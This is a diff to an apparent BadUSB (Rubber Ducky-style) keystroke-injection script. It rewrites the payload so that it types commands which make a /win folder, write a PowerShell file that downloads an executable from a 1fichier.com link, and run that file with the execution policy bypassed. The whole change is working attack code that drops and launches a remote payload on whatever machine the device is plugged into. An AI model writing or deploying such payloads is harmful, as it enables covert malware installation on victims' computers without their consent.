@@ -10,15 +10,19 @@ STRING cd /
 ENTER
 DELAY 4000
 
-mkdir /win 
+STRING mkdir /win 
 ENTER
 DELAY 4000
 
-cd /win 
+STRING cd /win 
 ENTER
 DELAY 4000
 
-echo (wget 'https://1fichier.com/?vcwr373r3a4sstxgguzr' -OutFile.a.exe) > b.PS1 & powershell -ExecutionPolicy ByPass -File b.ps1
+STRING echo (wget 'https://1fichier.com/?vcwr373r3a4sstxgguzr' -OutFile.a.exe) > b.PS1 
+ENTER
+DELAY 5000
+
+STRING powershell -ExecutionPolicy ByPass -File b.ps1
 ENTER
 DELAY 5000
 
